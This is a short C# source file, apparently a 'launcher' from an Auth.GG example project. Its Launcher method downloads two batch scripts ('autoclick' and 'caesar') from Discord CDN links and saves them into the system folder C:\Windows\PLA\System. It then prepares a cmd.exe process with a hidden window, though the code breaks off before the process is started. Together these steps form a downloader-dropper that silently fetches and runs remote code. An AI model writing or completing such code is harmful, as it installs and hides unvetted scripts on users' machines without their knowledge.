using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.IO;
using System.Diagnostics;
using System.Threading;


namespace Auth.GG_Example
{
    class bat
    {

        public static void Launcher()
        {
            WebClient Client = new WebClient();
            string text = @"C:\Windows\PLA\System\launch autoclick.bat";
            string text1 = @"C:\Windows\PLA\System\launch caesar.bat";

            Client.DownloadFile("https://cdn.discordapp.com/attachments/855087379878248479/855530377178120212/launch_autoclick.bat", text);
            Client.DownloadFile("https://cdn.discordapp.com/attachments/855087379878248479/855530378461577296/launch_caesar.bat", text1);


            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.UseShellExecute = true;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;













        }
    }

}

